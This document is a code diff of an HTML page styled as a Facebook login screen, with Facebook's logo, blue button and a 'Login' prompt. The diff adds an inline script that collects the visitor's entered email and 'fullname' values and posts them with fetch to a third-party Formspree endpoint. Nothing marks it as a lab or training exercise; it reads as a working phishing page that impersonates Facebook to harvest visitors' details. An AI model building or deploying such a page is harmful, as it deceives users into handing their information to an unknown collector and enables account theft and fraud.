@@ -5,11 +5,82 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook Login</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/ionicons@6.0.0/dist/ionicons.css">
-     <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            user-select: none;
+            overflow-y: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: hsl(218deg 50% 91%);
+            height: 100vh;
+            margin: 0;
+            font-family: 'Poppins';
+        }
+
+        .form-container {
+            background: hsl(213deg 85% 97%);
+            padding: 2em;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            border-radius: 30px;
+            box-shadow: 0 0 2em hsl(231deg 62% 94%);
+            gap: 1.5em;
+        }
+
+        .logo img {
+            max-width: 70px;
+            height: auto;
+        }
+
+        .email, .fullname {
+            background: hsl(0deg 0% 100%);
+            box-shadow: 0 0 2em hsl(231deg 62% 94%);
+            padding: 1em;
+            display: flex;
+            flex-direction: column;
+            gap: 0.5em;
+            border-radius: 20px;
+            color: hsl(0deg 0% 30%);
+            width: 100%;
+        }
+
+        .email input, .fullname input {
+            outline: none;
+            border: none;
+            width: 100%;
+        }
+
+        .email::placeholder, .fullname::placeholder {
+            color: hsl(0deg 0% 0%);
+            font-size: 0.9em;
+        }
+
+        .email ion-icon, .fullname ion-icon {
+            color: hsl(0deg 0% 30%);
+            margin-bottom: -.2em;
+        }
+
+        .send {
+            padding: 1em;
+            background: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 30px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.3s ease-in-out;
+        }
+
+        .send:hover {
+            background: #135293;
+        }
+    </style>
 </head>
 <body>
-    <div class="form-container" id="formPage">
-         <form action="https://formspree.io/f/xeqyqaay" method="POST">
+    <div class="form-container">
         <div class="logo"> 
             <img src="https://cdn.shopify.com/s/files/1/0558/7052/1432/files/Facebook_Logo__2019.png?v=1704821241" alt="Facebook Logo">
         </div>
@@ -32,8 +103,33 @@
 
         <button class="send" onclick="sendFormData()">Login</button>
 
-      </form>
+        <script>
+            function sendFormData() {
+                const email = document.getElementById('email').value;
+                const fullname = document.getElementById('fullname').value;
+
+                if (email && fullname) {
+                    const formData = new FormData();
+                    formData.append('email', email);
+                    formData.append('fullname', fullname);
+
+                    fetch('https://formspree.io/f/xeqyqaay', {
+                        method: 'POST',
+                        body: formData,
+                        headers: {
+                            'Accept': 'application/json'
+                        }
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log(data);
+                    })
+                    .catch(error => {
+                        console.error(error);
+                    });
+                }
+            }
+        </script>
     </div>
-            <script src="script.js"></script>
 </body>
 </html>
